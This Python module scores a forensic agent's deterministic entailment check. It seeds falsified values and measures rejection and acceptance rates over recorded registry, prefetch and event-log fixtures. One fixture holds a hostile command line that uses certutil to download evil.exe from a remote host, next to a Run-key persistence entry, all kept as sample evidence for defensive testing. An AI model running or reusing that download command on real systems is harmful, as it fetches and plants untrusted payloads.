"""Fact-fidelity rejection-rate metric: the entailment check, measured.

``scripts/entailment-demo.py`` shows the deterministic entailment check
(:func:`findevil_agent.entailment.check_entailment`) catching ONE misread. This
module turns that into a regenerable number, the way a verification layer should
be graded:

  * **Rejection rate** — of a seeded set of deliberately-false asserted values,
    the fraction the check rejects. Target 1.0; an escape is a verifier bug.
  * **Acceptance rate** — of the TRUE asserted values, the fraction the check
    accepts. Target 1.0; a drop here would make the rejection number meaningless
    (a check that rejects everything trivially scores 1.0 on rejection).

The seeded fabrications are false **by construction**: each is a known-wrong
mutation of a value that genuinely matches the evidence (a true assertion's own
``expected``), so the metric is not tautological. Falseness comes from ground
truth; the system under test (``check_entailment``) is run independently to see
whether it rejects. No LLM is ever in this loop — every number is a pure function
of the deterministic check over recorded tool output.

Scope (honest): this measures the structured-value entailment check over recorded
tool-output fixtures spanning the production artifact classes. It is not a live
end-to-end run; it grades the deterministic fence, which is exactly the layer that
stops a misread fact from reaching a verdict.
"""

from __future__ import annotations

import json
from collections.abc import Sequence
from dataclasses import dataclass
from datetime import datetime, timedelta

from findevil_agent.entailment import check_entailment
from findevil_agent.events import AssertedValue

# A sentinel that cannot occur in real evidence; used to build values that are
# false by construction (the analog of Casebound's "impostor" distinct-value).
_IMPOSTOR = "zz_impostor_value_absent_from_evidence_zz"
# A path that resolves to nothing (the analog of a citation to a nonexistent id).
_MISSING_PATH = "__no_such_field_in_any_evidence__"
# A grammatically invalid path: the bracket content is neither ``*`` nor an
# integer, so the path grammar rejects the segment (analog of a malformed
# citation).
_MALFORMED_PATH = "entries[bogus]"

REJECTION_RATE_TARGET = 1.0
ACCEPTANCE_RATE_TARGET = 1.0

# Human-readable label for the value-mutation fabrication, by match mode.
_VALUE_LABEL = {
    "exact": "wrong_value",
    "contains": "absent_substring",
    "int": "wrong_int",
    "iso_ts": "shifted_timestamp",
    "record": "broken_colocation",
}

__all__ = [
    "ACCEPTANCE_RATE_TARGET",
    "REJECTION_RATE_TARGET",
    "FactFidelityMetrics",
    "FidelityCase",
    "RateResult",
    "SeededFabrication",
    "acceptance_rate",
    "builtin_cases",
    "measure",
    "rejection_rate",
    "seed_false_variants",
]


@dataclass(frozen=True)
class SeededFabrication:
    """One deliberately-false asserted value and the kind of fabrication it is."""

    label: str
    match: str
    asserted_value: AssertedValue


@dataclass(frozen=True)
class RateResult:
    """A measured rate: ``count`` of ``total`` met the bar, with the offenders.

    For rejection, ``count`` is fabrications rejected and ``escapes`` names the
    ones that slipped through. For acceptance, ``count`` is true values accepted
    and ``escapes`` names the ones wrongly dropped. An empty population scores
    ``0.0`` on purpose: zero coverage is not a passing grade.
    """

    rate: float
    count: int
    total: int
    escapes: tuple[str, ...]


@dataclass(frozen=True)
class FidelityCase:
    """A recorded tool output plus the true asserted values it supports."""

    name: str
    parsed_output: dict
    true_assertions: tuple[AssertedValue, ...]


@dataclass(frozen=True)
class FactFidelityMetrics:
    """The headline numbers, regenerated from the deterministic check."""

    rejection: RateResult
    acceptance: RateResult
    modes_covered: tuple[str, ...]

    def meets_targets(self) -> bool:
        """True only when both rates hit 1.0 over a non-empty population."""
        return (
            self.rejection.total > 0
            and self.acceptance.total > 0
            and self.rejection.rate >= REJECTION_RATE_TARGET
            and self.acceptance.rate >= ACCEPTANCE_RATE_TARGET
        )

    def to_dict(self) -> dict:
        """JSON-ready record for persistence and the report layer."""
        return {
            "rejection_rate": self.rejection.rate,
            "rejected_fabrications": self.rejection.count,
            "seeded_fabrications": self.rejection.total,
            "rejection_escapes": list(self.rejection.escapes),
            "acceptance_rate": self.acceptance.rate,
            "accepted_true_values": self.acceptance.count,
            "true_values": self.acceptance.total,
            "acceptance_escapes": list(self.acceptance.escapes),
            "modes_covered": list(self.modes_covered),
            "targets": {
                "rejection_rate": REJECTION_RATE_TARGET,
                "acceptance_rate": ACCEPTANCE_RATE_TARGET,
            },
            "meets_targets": self.meets_targets(),
        }


def seed_false_variants(true_av: AssertedValue) -> list[SeededFabrication]:
    """Build the guaranteed-false mutations of one true asserted value.

    Three fabrications per true value: a mode-specific wrong value, the same
    assertion pointed at a nonexistent path, and at a malformed path. Each is
    false by construction, so a check that rejects all three is doing its job.
    """
    return [
        SeededFabrication(
            label=_VALUE_LABEL.get(true_av.match, "wrong_value"),
            match=true_av.match,
            asserted_value=_falsify_value(true_av),
        ),
        SeededFabrication(
            label="missing_path",
            match=true_av.match,
            asserted_value=true_av.model_copy(update={"path": _MISSING_PATH}),
        ),
        SeededFabrication(
            label="malformed_path",
            match=true_av.match,
            asserted_value=true_av.model_copy(update={"path": _MALFORMED_PATH}),
        ),
    ]


def _falsify_value(av: AssertedValue) -> AssertedValue:
    """Return ``av`` with ``expected`` mutated into a value the evidence cannot
    satisfy, choosing the mutation by match mode so it stays parseable (and so the
    check rejects it on the comparison, not on a parse error)."""
    if av.match == "int":
        false_expected = _falsify_int(av.expected)
    elif av.match == "iso_ts":
        false_expected = _falsify_timestamp(av.expected)
    elif av.match == "record":
        false_expected = _falsify_record(av.expected)
    elif av.match == "contains":
        false_expected = _IMPOSTOR
    else:  # exact
        false_expected = av.expected + _IMPOSTOR
    return av.model_copy(update={"expected": false_expected})


def _falsify_int(expected: str) -> str:
    """A different integer (real + 1), so the int comparison fails."""
    try:
        return str(int(str(expected).strip(), 0) + 1)
    except (ValueError, TypeError):
        return "999999999"


def _falsify_timestamp(expected: str) -> str:
    """The same time shifted six hours: still a valid timestamp, different instant."""
    text = str(expected).strip().replace("Z", "+00:00")
    try:
        shifted = datetime.fromisoformat(text) + timedelta(hours=6)
    except ValueError:
        return f"{expected}{_IMPOSTOR}"
    return shifted.isoformat()


def _falsify_record(expected: str) -> str:
    """Break co-location: corrupt one constraint so no single record satisfies all."""
    try:
        constraints = json.loads(expected)
    except (ValueError, TypeError):
        return f"{expected}{_IMPOSTOR}"
    if not isinstance(constraints, dict) or not constraints:
        return json.dumps({"__absent__": _IMPOSTOR})
    last_key = list(constraints)[-1]
    broken = {**constraints, last_key: f"{constraints[last_key]}{_IMPOSTOR}"}
    return json.dumps(broken)


def rejection_rate(fabrications: Sequence[SeededFabrication], parsed_output: dict) -> RateResult:
    """Run each fabrication through the real check; count how many are rejected."""
    total = len(fabrications)
    escapes = tuple(
        f.label for f in fabrications if check_entailment([f.asserted_value], parsed_output).passed
    )
    rejected = total - len(escapes)
    return RateResult(
        rate=rejected / total if total else 0.0,
        count=rejected,
        total=total,
        escapes=escapes,
    )


def acceptance_rate(true_avs: Sequence[AssertedValue], parsed_output: dict) -> RateResult:
    """Confirm the true asserted values still pass (the rejection control)."""
    total = len(true_avs)
    escapes = tuple(av.path for av in true_avs if not check_entailment([av], parsed_output).passed)
    accepted = total - len(escapes)
    return RateResult(
        rate=accepted / total if total else 0.0,
        count=accepted,
        total=total,
        escapes=escapes,
    )


def measure(cases: Sequence[FidelityCase]) -> FactFidelityMetrics:
    """Aggregate rejection and acceptance across every case."""
    rej_count = rej_total = acc_count = acc_total = 0
    rej_escapes: list[str] = []
    acc_escapes: list[str] = []
    modes: set[str] = set()
    for case in cases:
        for av in case.true_assertions:
            modes.add(av.match)
            r = rejection_rate(seed_false_variants(av), case.parsed_output)
            rej_total += r.total
            rej_count += r.count
            rej_escapes.extend(r.escapes)
        a = acceptance_rate(list(case.true_assertions), case.parsed_output)
        acc_total += a.total
        acc_count += a.count
        acc_escapes.extend(a.escapes)
    rejection = RateResult(
        rate=rej_count / rej_total if rej_total else 0.0,
        count=rej_count,
        total=rej_total,
        escapes=tuple(rej_escapes),
    )
    acceptance = RateResult(
        rate=acc_count / acc_total if acc_total else 0.0,
        count=acc_count,
        total=acc_total,
        escapes=tuple(acc_escapes),
    )
    return FactFidelityMetrics(
        rejection=rejection, acceptance=acceptance, modes_covered=tuple(sorted(modes))
    )


# ---------------------------------------------------------------------------
# Built-in corpus: recorded tool-output fixtures spanning the production
# artifact classes, so every match mode is exercised by the standing gate.
# ---------------------------------------------------------------------------


def _registry_case() -> FidelityCase:
    """A registry Run-key persistence output: exact, record, and iso_ts."""
    out = {
        "entries": [
            {
                "key_path": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                "last_write_time_iso": "2018-09-06T19:00:00Z",
                "values": [
                    {
                        "name": "Updater",
                        "value_type": "RegSz",
                        "data_str": "C:\\Users\\bob\\AppData\\Roaming\\evil.exe",
                    }
                ],
            }
        ],
        "keys_visited": 1,
    }
    return FidelityCase(
        name="registry_query/run_key",
        parsed_output=out,
        true_assertions=(
            AssertedValue(
                path="entries[*].values[*].data_str",
                expected="C:\\Users\\bob\\AppData\\Roaming\\evil.exe",
                match="exact",
            ),
            AssertedValue(
                path="entries[*].values[*]",
                expected='{"name": "Updater", "data_str": "evil.exe"}',
                match="record",
            ),
            AssertedValue(
                path="entries[*].last_write_time_iso",
                expected="2018-09-06T19:00:00Z",
                match="iso_ts",
            ),
        ),
    )


def _prefetch_case() -> FidelityCase:
    """A prefetch parse output: the int run-count."""
    out = {
        "executable_name": "EVIL.EXE",
        "run_count": 8,
        "last_run_times_iso": ["2021-03-04T12:00:00Z"],
    }
    return FidelityCase(
        name="prefetch_parse/run_count",
        parsed_output=out,
        true_assertions=(AssertedValue(path="run_count", expected="8", match="int"),),
    )


def _evtx_case() -> FidelityCase:
    """A command-line row: the contains substring match."""
    out = {
        "rows": [
            {
                "CommandLine": "C:\\Windows\\System32\\certutil.exe -urlcache -split -f http://x/evil.exe",
            }
        ]
    }
    return FidelityCase(
        name="evtx_query/command_line",
        parsed_output=out,
        true_assertions=(
            AssertedValue(
                path="rows[*].CommandLine",
                expected="certutil.exe -urlcache",
                match="contains",
            ),
        ),
    )


def builtin_cases() -> list[FidelityCase]:
    """The standing corpus: every match mode, drawn from recorded output shapes."""
    return [_registry_case(), _prefetch_case(), _evtx_case()]
